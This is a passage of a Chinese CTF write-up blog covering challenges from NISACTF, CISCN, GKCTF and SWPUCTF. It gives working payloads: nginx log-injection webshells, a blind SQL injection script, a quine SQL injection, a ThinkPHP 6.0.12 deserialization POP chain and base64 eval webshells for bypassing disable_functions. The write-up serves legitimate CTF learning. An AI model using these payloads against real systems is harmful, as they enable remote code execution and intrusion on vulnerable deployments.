协议可以用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:///etc/passwd</span><br><span class=\"line\">但是过滤了flag和php关键字</span><br></pre></td></tr></table></figure>\n<p>这里学到个新知识：日志注入<br>\n抓包，改？file=/var/log/nginx/access.log<br>\n 然后在 user-agent 里写一句话木马或者直接执行命令即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: &lt;?php system(&#x27;cat /ffflllaaaggg&#x27;);?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php @eval($_GET[&#x27;a&#x27;]); ?&gt;</span><br><span class=\"line\">url:</span><br><span class=\"line\">?file=/var/log/nginx/access.log&amp;a=system(&#x27;cat /ffflllaaaggg&#x27;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"41nisactf-2022hardsql\"><a class=\"markdownIt-Anchor\" href=\"#41nisactf-2022hardsql\">#</a> 41.[NISACTF 2022]hardsql</h2>\n<p>考点:quine 注入<br>\n用户名只能是 bilala, 密码是字符型，fuzz 一下发现空格被过滤，用 <code>/**/</code>  替代<br>\n可以用布尔盲注脚本跑出密码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"> </span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://1.14.71.254:28860/login.php&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">str</span> = <span class=\"string\">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">62</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>:</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;username&#x27;</span>: <span class=\"string\">&#x27;bilala&#x27;</span>, <span class=\"string\">&quot;passwd&quot;</span>:<span class=\"string\">f&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;<span class=\"subst\">&#123;flag+j&#125;</span>%&#x27;#&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        response = requests.post(url, data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;nothing found&quot;</span> <span class=\"keyword\">not</span>  <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">            flag = flag + j</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"><span class=\"comment\">#b2f2d15b3ae082ca29697d8dcd420fd7</span></span><br></pre></td></tr></table></figure>\n<p>登录得到了源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//多加了亿点点过滤</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include_once</span>(<span class=\"string\">&quot;config.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">alertMes</span>(<span class=\"params\"><span class=\"variable\">$mes</span>, <span class=\"variable\">$url</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;<span class=\"subst\">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class=\"subst\">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkSql</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\\\\$|char|\\x0a|\\x09|column|sleep|\\ /i&quot;</span>, <span class=\"variable\">$s</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&#x27;waf here&#x27;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>] != <span class=\"string\">&#x27;&#x27;</span> &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>] != <span class=\"string\">&#x27;&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$username</span> !== <span class=\"string\">&#x27;bilala&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&#x27;only bilala can login&#x27;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">checkSql</span>(<span class=\"variable\">$password</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class=\"subst\">$password</span>&#x27;;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$user_result</span> = <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$MysqlLink</span>, <span class=\"variable\">$sql</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"variable\">$user_result</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"variable\">$row</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&#x27;nothing found&#x27;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;passwd&#x27;</span>] === <span class=\"variable\">$password</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$password</span> == <span class=\"string\">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">die</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"variable\">$FLAG</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">alertMes</span>(<span class=\"string\">&quot;wrong password&quot;</span>, <span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>关键在传入的 passwd, 要强等于 password 且不等于 b2f2d15b3ae082ca29697d8dcd420fd7, 这里要控制 passwd 的输入输出一样，就需要 quine 注入，<a href=\"https://hq185187.github.io/2023/05/12/nssctf2/#25hdctf-2023loginmaster\"> 具体过滤看这里</a>，这里 char 被过滤用 0x 替代<br>\n payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>\n<h2 id=\"42ciscn-2022-初赛ezpop\"><a class=\"markdownIt-Anchor\" href=\"#42ciscn-2022-初赛ezpop\">#</a> 42.[CISCN 2022 初赛] ezpop</h2>\n<p>打开发现是 thinkphpv6.0.12 版本，扫一下目录发现 www.zip, 可以下载源码.<mark> 此题考查 thinkphp 框架审计，找个 exp</mark></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title class_\">abstract</span> <span class=\"title class_\">class</span> <span class=\"title class_\">Model</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title class_\">private</span> $<span class=\"title class_\">lazySave</span> = <span class=\"title class_\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$exists</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$table</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$withAttr</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$json</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$jsonAssoc</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$obj</span> = <span class=\"string\">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;lazySave = True;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;data = [<span class=\"string\">&#x27;whoami&#x27;</span> =&gt; [<span class=\"string\">&#x27;cat /nssctfflag&#x27;</span>]];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;exists = True;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;table = <span class=\"variable\">$obj</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;withAttr = [<span class=\"string\">&#x27;whoami&#x27;</span> =&gt; [<span class=\"string\">&#x27;system&#x27;</span>]];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;json = [<span class=\"string\">&#x27;whoami&#x27;</span>,[<span class=\"string\">&#x27;whoami&#x27;</span>]];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;jsonAssoc = True;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title class_\">echo</span>(<span class=\"title class_\">urlencode</span>(<span class=\"title class_\">serialize</span>(<span class=\"title class_\">new</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">Pivot</span>(<span class=\"title class_\">new</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">Pivot</span>()))));</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"43gkctf-2020checkin\"><a class=\"markdownIt-Anchor\" href=\"#43gkctf-2020checkin\">#</a> 43.[GKCTF 2020]CheckIN</h2>\n<p><mark>本题考点 disable_function 的绕过</mark><br>\n代码审计，传个 Ginkgo, 内容为 base64 编码后的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system(&#x27;whoami&#x27;);</span><br><span class=\"line\">system(&#x27;ls /&#x27;);</span><br><span class=\"line\">这些都不行,system函数应该被禁用了</span><br><span class=\"line\"></span><br><span class=\"line\">尝试phpinfo();</span><br><span class=\"line\">?Ginkgo=cGhwaW5mbygpOw==</span><br><span class=\"line\">ctrl+f搜索disable_functions查看被禁用的函数,系统执行函数都被禁用了</span><br><span class=\"line\"></span><br><span class=\"line\">换思路连蚁剑:eval($_POST[1]);</span><br><span class=\"line\">?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</span><br><span class=\"line\"></span><br><span class=\"line\">根目录下可以看到/flag但是权限是700无法读取,而readflag是个可执行文件，但是因为一些函数被禁，所以无法执行这个文件,我们可以尝试绕过disable_function</span><br><span class=\"line\"></span><br><span class=\"line\">php7（php7.0-7.3）中的因为垃圾回收机制(GC)造成的UAF漏洞</span><br></pre></td></tr></table></figure>\n<p>GitHub 上有脚本，来进行命令执行<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21tMHIxL2V4cGxvaXRzL3RyZWUvbWFzdGVyL3BocDctZ2MtYnlwYXNz\"> php7-gc-bypass</span><br>\n 把文件写入 /tmp 文件夹，因为只有它有写的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&#x27;/tmp/1.php&#x27;);</span><br><span class=\"line\">?Ginkgo=aW5jbHVkZSgnL3RtcC8xLnBocCcpOw==</span><br></pre></td></tr></table></figure>\n<h2 id=\"44swpuctf-2021-新生赛babyunser\"><a class=\"markdownIt-Anchor\" href=\"#44swpuctf-2021-新生赛babyunser\">#</a> 44.[SWPUCTF 2021 新生赛] babyunser</h2>\n<p><mark>考点:phar 反序列化</mark><br>\n关于 phar 反序列化的基础可以看这篇博客<a href=\"\"> phar 反序列化</a></p>\n<p>因为会把上传的文件加上 txt 后缀，一开始想利用 phar 文件包含漏洞读取压缩包里面的马，尝试把木马文件压缩成压缩包，zoe.zip, 里面有 zoe.php, 上传进去后，蚁剑连不上去的，/upload/1500ea32e30d649b42e7d5ed6944fcbe.txt (压缩包) 可以访问，而 /upload/1500ea32e30d649b42e7d5ed6944fcbe.txt/zoe.php 返回 404, 而在 read.php 里面读取 phar://upload/1500ea32e30d649b42e7d5ed6944fcbe.txt/zoe.php 却可以，因此此题不是考文件包含，换个思路:phar 反序列化</p>\n<p>首先可以根据查看文件读取 read.php，upload.php,<br>\nclass.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">aa</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"string\">&#x27;aa&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$this</span>-&gt;name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ff</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content=<span class=\"string\">&quot;\\&lt;?php @eval(\\$_POST[1]);?&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$key</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$key</span>-&gt;&#123;<span class=\"variable language_\">$this</span>-&gt;func&#125;(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">zz</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$content</span>=<span class=\"string\">&#x27;surprise&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;filename=<span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^\\/|php:|data|zip|\\.\\.\\//i&#x27;</span>,<span class=\"variable\">$this</span>-&gt;filename))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;这不合理&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span>=<span class=\"variable language_\">$this</span>-&gt;filename;</span><br><span class=\"line\">        <span class=\"variable\">$lt</span>=<span class=\"variable language_\">$this</span>-&gt;filename-&gt;<span class=\"variable\">$var</span>;</span><br><span class=\"line\">        <span class=\"comment\">//此功能废弃，不想写了</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span 